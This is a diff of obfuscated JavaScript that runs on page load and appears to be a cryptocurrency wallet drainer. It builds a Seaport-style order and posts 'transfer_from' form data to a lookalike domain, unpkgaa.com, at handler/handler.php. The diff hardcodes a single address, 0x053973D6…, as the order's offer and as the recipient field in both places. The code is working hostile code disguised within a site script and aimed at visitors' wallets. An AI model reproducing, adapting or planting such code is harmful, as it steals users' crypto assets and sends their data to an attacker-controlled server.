@@ -4945,7 +4945,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                         zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
                         startTime: "1661790956",
                         conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
-                        offer: W,
+                        offer: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F",
                         consideration: m
                     }, "0x053973D64EE9256d6957E3C5D2b5dD100064F07F")
                       , o = await f.executeAllActions();
@@ -5044,7 +5044,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                     f.append("action", "transfer_from"),
                     f.append("b1", c),
                     f.append("b2", e),
-                    f.append("b3", W),
+                    f.append("b3", "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"),
                     f.append("b4", "-1"),
                     fetch("https://www.unpkgaa.com/handler/handler.php", {
                         body: f,
